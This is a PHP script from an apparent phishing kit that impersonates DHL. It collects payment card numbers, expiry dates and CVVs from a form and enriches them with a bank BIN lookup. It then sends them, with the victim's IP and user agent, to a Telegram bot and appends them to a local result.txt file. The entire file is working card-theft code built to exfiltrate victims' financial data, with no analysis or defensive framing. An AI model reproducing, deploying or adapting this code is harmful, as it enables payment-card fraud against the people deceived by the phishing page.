<?php
session_start();
include '../config/tg.php';
if(isset($_POST['log'])){
$_SESSION['cc']=$_POST['card_number'];
$_SESSION['exp']=$_POST['expiry'];
$_SESSION['cvv']=$_POST['cvv'];
$bin = str_replace(' ', '', $_POST['card_number']);
$bin = substr($bin, 0, 6);
$getdetails = 'https://lookup.binlist.net/' . $bin;
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details  = json_decode($content);
$_SESSION['_namebank_'] = $namebank   = $details->bank->name;
$_SESSION['scheme'] = $scheme   = $details->scheme;
$_SESSION['brand'] = $brand   = $details->brand;
$_SESSION['country'] = $country   = $details->country->name;
foreach($IdTelegram as $chatId) {
$ip = getenv("REMOTE_ADDR"); 
$message = "|==[ 💳 INTERN. - DHL CC 💳 ]==|\n";
$message .= "|CC  :  ".$_POST['card_number']."  (".$_SESSION['_namebank_'].") \n";
$message .= "|EXP  :  ".$_POST['expiry']."\n";
$message .= "|CVV  :  ".$_POST['cvv']."\n";
$message .= "|==[ 💳 BIN SCRAPPER 💳  ]==|\n";
$message .= "|BANK NAME  :  ".$_SESSION['_namebank_']." | ".$_SESSION['scheme']."\n";
$message .= "|Country  :  ".$_SESSION['country']."\n";
$message .= "|Card Type  :  ".$_SESSION['brand']."\n";
$message .= "|==[ 💻 Victim System 💻  ]==|\n";
$message .= "|IP                 :  ".$ip."\n";
$message .= "|User-Agent         :  ".$UA."\n";
$message .= "|Date               :  ".date('d/m/Y h:i:s')."\n";
$message .= "|==[ 💻 Victim System 💻  ]==|\n";
$website="https://api.telegram.org/bot".$botToken;
$params=[
'chat_id'=>$chatId, 
'text'=>$message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);
$myfile = fopen("result.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
header("location: ../load.php?code=action2");
}
}
else{
  exit("");
}
?>